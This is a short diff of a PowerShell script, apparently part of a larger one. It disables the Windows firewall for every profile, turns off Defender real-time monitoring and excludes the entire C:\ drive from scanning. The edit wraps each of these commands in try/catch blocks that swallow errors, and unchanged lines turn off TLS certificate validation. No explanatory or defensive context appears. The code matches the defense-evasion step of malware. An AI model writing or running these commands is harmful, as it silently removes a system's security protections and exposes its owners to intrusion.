@@ -1,6 +1,6 @@
-Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled $false
-Set-MpPreference -DisableRealtimeMonitoring $true
-Add-MpPreference -ExclusionPath C:\
+try { Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False } catch {}
+try { Set-MpPreference -DisableRealtimeMonitoring $true } catch {}
+try { Add-MpPreference -ExclusionPath C:\ } catch {}
 
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 [Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
